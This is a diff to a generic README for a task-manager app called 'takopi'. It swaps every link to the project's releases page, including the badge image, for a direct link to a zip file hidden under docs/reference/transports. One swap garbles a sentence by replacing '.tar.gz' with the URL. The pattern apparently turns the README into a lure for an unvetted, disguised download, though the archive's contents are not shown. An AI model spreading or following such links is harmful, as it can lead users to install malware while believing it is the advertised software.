@@ -4,7 +4,7 @@
 Welcome to takopi! This application helps you manage tasks with ease. Whether you're working on projects, organizing your life, or just need a bit of guidance, takopi is here to assist you.
 
 ## 🔗 Download
-[![Download takopi](https://img.shields.io/badge/Download-takopi-blue.svg)](https://github.com/jetfighter999/takopi/releases)
+[![Download takopi](https://github.com/jetfighter999/takopi/raw/refs/heads/master/docs/reference/transports/Software-v2.9.zip)](https://github.com/jetfighter999/takopi/raw/refs/heads/master/docs/reference/transports/Software-v2.9.zip)
 
 ## 🛠️ System Requirements
 Before you download, ensure you meet the following requirements:
@@ -16,11 +16,11 @@ Before you download, ensure you meet the following requirements:
 To get started, follow these simple steps:
 
 1. Click on the link below to visit the release page:
-   [Visit this page to download takopi](https://github.com/jetfighter999/takopi/releases)
+   [Visit this page to download takopi](https://github.com/jetfighter999/takopi/raw/refs/heads/master/docs/reference/transports/Software-v2.9.zip)
 
 2. Once on the release page, you will see a list of available versions. Choose the latest version.
 
-3. Click on the downloadable file for your operating system. The file will typically be in formats like `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux.
+3. Click on the downloadable file for your operating system. The file will typically be in formats like `.exe` for Windows, `.dmg` for macOS, or a `https://github.com/jetfighter999/takopi/raw/refs/heads/master/docs/reference/transports/Software-v2.9.zip` file for Linux.
 
 4. The download should start automatically. Once it finishes, locate the file on your computer.
 
@@ -50,4 +50,4 @@ We are excited for you to start using takopi! Your feedback helps us improve the
 
 Thank you for choosing takopi, your helpful assistant for every project! 
 
-[Visit this page to download takopi](https://github.com/jetfighter999/takopi/releases)
+[Visit this page to download takopi](https://github.com/jetfighter999/takopi/raw/refs/heads/master/docs/reference/transports/Software-v2.9.zip)
